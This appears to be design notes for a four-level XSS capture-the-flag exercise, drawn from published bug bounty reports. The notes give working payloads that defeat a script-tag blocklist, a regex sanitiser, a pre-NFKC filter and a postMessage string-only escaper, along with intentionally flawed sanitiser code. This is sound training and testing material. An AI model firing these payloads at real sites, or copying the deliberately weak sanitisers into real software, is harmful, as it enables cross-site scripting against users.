# Challenge design from documented XSS reports

Source corpus used in a real session: `~/FAN/Vault/XSS/` (12 playbooks built
from 562 HackerOne reports + 207 FirstBlood disclosures). Read `README.md` for
the index, then the `## 11. Historical Bug Bounty Case Studies` section of each
playbook — each case study gives the mechanism, the payload (sometimes verbatim
and published), and the program. Design the level from the **mechanism**, not
by inventing a filter.

## Difficulty ladder that worked

### Basic — blocklist that names one tag (FILT-017 / REFL-025 shape)
Sink: text-node reflection. Filter: `raw.replace(/<\/?script[^>]*>/gi, '')`.
Payload: `<svg/onload=alert(1)>` (or `<img src=x onerror=alert(1)>`).

Lesson: event-handler vectors need no `<script>` tag; a tag-name blocklist is
not a sanitiser.

### Medium — regex sanitiser vs the parser (DOM-020, grab.com, report 247246)
Sink: `location.hash` → `sanitise` → `innerHTML`, fragment only (never hits the
server). Sanitiser: `raw.replace(/<\/?\w+[^>]*\/?>/g, '')` — requires a word
char after `<`.

Payload: `<<a/:<"a">img src=# onerror=alert(1)>`

Why: the regex eats `<a/:<"a">`, leaving a spare `<` glued to
`img src=# onerror=alert(1)>` → a real element. Published PoC from the report:
`%3C%3Ca/%3A%3C%22a%22%3Eimg%20src%3D%23%20onerror%3Dconfirm%28%27XSSED%27%29%3E`.

### Hard — filter runs before Unicode normalisation (STOR-142 / STOR-143, Rockstar)
Sink: stored profile/feed field. Write path strips ASCII tags and the word
`script`; render path calls `String(value).normalize('NFKC')` "for display
consistency". The sanitiser never sees an angle bracket; NFKC folds fullwidth
forms into ASCII afterwards.

Payload (published in STOR-143): `†‡•＜img src=a onerror=javascript:alert('hacked')>…‰€`

Notes: `＜` U+FF1C / `＞` U+FF1E fold to `<` / `>` under NFKC; `javascript:` in a
handler is a labelled statement, so the alert still runs. The general lesson is
**sanitise after every transform, never before** (also applies to markdown,
BBCode, linkification).

### Expert — postMessage + string-only escaper (DOM-018, Shopify, $3,000)
Sink: `window.addEventListener('message', ...)` with no origin check, then
`box.innerHTML = esc(data.html)` where `esc(v)` returns `v` unchanged when
`typeof v !== 'string'`. Structured clone keeps arrays/objects intact;
`innerHTML = ['<img …>']` stringifies the array.

Payload (as typed into the console, JSON-parsed and sent as `{html: [...]}`):
`["<img src=x onerror=alert(1)>"]`

Console/target contract:
```js
// console, after iframe onload (~250ms)
let v; try { v = JSON.parse(box); } catch { v = box; }
frame.contentWindow.postMessage({ html: v }, '*' /* target has no origin check */);

// target
function esc(v) { if (typeof v !== 'string') return v; /* escape the rest */ }
window.addEventListener('message', (e) => {
  box.innerHTML = esc(e.data && e.data.html);   // array → stringified → executes
});
```

Lesson: origin validation and a type check are not sanitisers; both controls
must be independent.

## Gating recipe (solutions hidden until first attempt)
- `solutionUnlocked = attempts >= 1`; hint tiers 1 free / 2 after one attempt /
  3 after two.
- Three enforcement points: page tab (locked badge, not an `<a>`), server route
  (`attempts === 0` → locked panel, payload absent from HTML), navbar solutions
  index (row says "Locked — attempt it first" + hints link).
- Test both directions: locked HTML does **not** contain the payload string,
  unlocked HTML does.

## Self-test assertions that caught real bugs
1. `payload dialog fired` — push `d.message()` before dismissing.
2. `flag popup auto-opened` — poll for `#flagmodal` not `hidden`.
3. `in-page dialog carries the flag` — the message includes both "XSS CONFIRMED"
   and the flag value.
4. `submitting the popup flag solved it` — submit from the modal, then assert
   the state endpoint says `solved`.
5. `wrong flag rejected` — POST a bogus flag after capture.
6. `solution unlocked after the attempt` — fetch the write-up route and assert
   the locked marker is gone.
7. Pacing: fresh browser context, 13 rapid attempts → `200×12, 429`.

## Flag naming
`flag{<appslug>_<levelid>_<10 hex>}` (e.g. `flag{ticketthive_c1_0972906197}`)
keeps levels distinguishable in screenshots and the evidence log.
